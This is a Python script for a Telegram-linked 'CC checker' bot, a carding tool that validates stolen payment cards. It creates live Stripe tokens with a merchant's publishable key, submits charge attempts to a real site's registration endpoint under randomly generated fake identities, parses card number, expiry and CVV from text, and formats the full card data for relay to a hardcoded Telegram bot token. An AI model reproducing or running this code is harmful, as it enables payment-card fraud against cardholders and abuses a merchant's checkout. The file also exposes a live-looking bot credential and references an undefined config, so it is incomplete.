from rich.console import Console
import telebot
from rich.text import Text
from rich.panel import Panel
from rich import print as rprint
from rich.style import Style
import user_agent
console = Console()

TELEGRAM_BOT_TOKEN = '7638618978:AAHZVGSG_jFLEr8VmBUSKUS106NAHogE1Go'
TELEGRAM_USER_ID = '7092074614'

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

#-----[UserAgent]-----#
user = user_agent.generate_user_agent()
banner = Text()
banner.append("❀❀❀ 𝙼𝙴𝚃𝙷𝚇𝙲𝙲 𝙲𝙷𝙴𝙲𝙺𝙴𝚁 ❀❀❀\n", style=Style(color="cyan", bold=True))
banner.append("❀═══════════༺༻═══════════❀\n", style=Style(color="green", bold=True))
banner.append("⚡ Power, Precision, Performance ⚡\n", style=Style(color="bright_yellow", bold=True))
banner.append("❀═══════════༺༻═══════════❀\n", style=Style(color="green", bold=True))
console.print(banner)

def send_telegram_message(message):
    try:
        bot.send_message(TELEGRAM_USER_ID, message, parse_mode='Markdown')
    except Exception as e:
        rprint(Panel(Text(f"Failed to send Telegram message: {e}", style="red"), title="Telegram Error"))
        
import re
import random
import string
import time
import json
import requests
from datetime import datetime
import uuid

def generate_random_data():
    # Generate random first and last names
    firstname = ''.join(random.sample(string.ascii_lowercase, 8))
    lastname = ''.join(random.sample(string.ascii_lowercase, 8))
    
    # Generate random email with common domains
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    random_domain = random.choice(domains)
    email = f"{firstname}{random.randint(100,999)}@{random_domain}"
    
    return {
        'firstname': firstname.capitalize(),
        'lastname': lastname.capitalize(),
        'email': email,
    }

def check_cc(cc, month, year, cvv):
    random_data = generate_random_data()
    
    # First Request - Generate Stripe Token
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    data = {
        'card[number]': cc,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'card[cvc]': cvv,
        'card[name]': f"{random_data['firstname']} {random_data['lastname']}",
        'time_on_page': random.randint(30000, 60000),
        'guid': str(uuid.uuid4()),
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()),
        'key': 'pk_live_7brFCCZ0CF9HUzYyJ3a7aMj2',
        'payment_user_agent': 'stripe.js/78ef418'
    }

    response1 = requests.post('https://api.stripe.com/v1/tokens', 
                            headers=headers, 
                            data=data, 
                            verify=False)
    token = response1.json()
    
    if 'id' not in token:
        return {
            'success': False,
            'message': 'Token generation failed',
            'error': token.get('error', {}).get('message', 'Unknown error')
        }

    # Second Request - Charge Attempt
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://frethub.com',
        'referer': 'https://frethub.com/free-trial-join/'
    }

    charge_data = {
        'nonce': uuid.uuid4().hex,
        'stripe_action': 'charge',
        'charge_type': 'new',
        'subscription': '1',
        'first_name': random_data['firstname'],
        'last_name': random_data['lastname'],
        'email': random_data['email'],
        'cc_number': cc,
        'cc_expmonth': month,
        'cc_expyear': year,
        'cc_cvc': cvv,
        'stripeToken': token['id']
    }

    response2 = requests.post('https://frethub.com/register/FJKfhw',
                            headers=headers,
                            data=charge_data)
    
    if 'status=success' in response2.text:
        return {
            'success': True,
            'message': 'Card charged successfully'
        }
    else:
        error = response2.text.split('reason=')[1] if 'reason=' in response2.text else 'Card declined'
        return {
            'success': False,
            'message': error
        }

def format_response(check, cc_data):
    emojis = "✅" if check['success'] else "❌"
    current_time = datetime.now().strftime('%I:%M:%S %p')
    
    return f"""
╔════════════════════╗
║ 𝗖𝗖 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 ║
╚════════════════════╝

▶️ 𝗖𝗖: {cc_data['cc']}
▶️ 𝗠𝗠/𝗬𝗬: {cc_data['month']}/{cc_data['year']}
▶️ 𝗖𝗩𝗩: {cc_data['cvv']}

𝗦𝘁𝗮𝘁𝘂𝘀: {emojis} {check['message']}
𝗧𝗶𝗺𝗲: {current_time}

═══════════════════
𝗕𝗢𝗧 𝗕𝗬: {config['owner']}
"""

def extract_cc(text):
    patterns = [
        r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})'
    ]
    
    for pattern in patterns:
        matches = re.search(pattern, text)
        if matches:
            return {
                'cc': matches.group(1),
                'month': matches.group(2),
                'year': matches.group(3)[-2:] if len(matches.group(3)) == 4 else matches.group(3),
                'cvv': matches.group(4)
            }
    return False

